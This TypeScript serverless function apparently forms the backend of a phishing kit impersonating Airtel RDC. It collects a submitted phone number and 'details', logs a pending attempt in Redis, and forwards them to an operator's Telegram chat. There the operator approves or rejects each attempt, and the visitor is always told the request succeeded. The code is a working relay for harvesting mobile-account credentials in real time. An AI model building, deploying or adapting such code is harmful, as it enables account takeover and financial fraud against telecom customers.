// Zero-dependency serverless function using native fetch for Vercel Node.js runtime

export default async function handler(req: any, res: any) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader(
        'Access-Control-Allow-Headers',
        'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );

    if (req.method === "OPTIONS") {
        return res.status(200).end();
    }

    if (req.method !== "POST") {
        return res.status(405).json({ message: "Method Not Allowed" });
    }

    try {
        const body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
        const { type, name, phone, details } = body;

        if (!phone) {
            return res.status(400).json({ success: false, message: "Phone number is required" });
        }

        const attemptId = Math.random().toString(36).substring(2, 15);

        // 1. Write to Upstash Redis via native REST API if configured
        const redisUrl = process.env.UPSTASH_REDIS_REST_URL;
        const redisToken = process.env.UPSTASH_REDIS_REST_TOKEN;

        if (redisUrl && redisToken) {
            try {
                await fetch(redisUrl, {
                    method: "POST",
                    headers: {
                        Authorization: `Bearer ${redisToken}`,
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(["SET", `attempt:${attemptId}`, "pending", "EX", 300]),
                });
            } catch (redisErr) {
                console.warn("Redis write failed:", redisErr);
            }
        }

        // 2. Send Telegram notification if configured
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (botToken && chatId) {
            try {
                const message = `🔔 *Nouvelle Demande Airtel RDC*\n\n*Type:* ${type || 'Connexion'}\n*Téléphone:* ${phone}\n*Détails:* ${details || 'N/A'}\n\n*ID Tentative:* \`${attemptId}\``;
                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

                await fetch(telegramUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: "Markdown",
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: "✅ Approuver", callback_data: `approve_${attemptId}` },
                                    { text: "❌ Rejeter", callback_data: `reject_${attemptId}` }
                                ]
                            ]
                        }
                    }),
                });
            } catch (tgErr) {
                console.warn("Telegram send failed:", tgErr);
            }
        } else {
            console.warn("Telegram credentials not set in environment.");
        }

        return res.status(200).json({ success: true, attemptId });
    } catch (error: any) {
        console.error("Callback handler error:", error);
        return res.status(200).json({ success: true, attemptId: "fallback_" + Date.now() });
    }
}
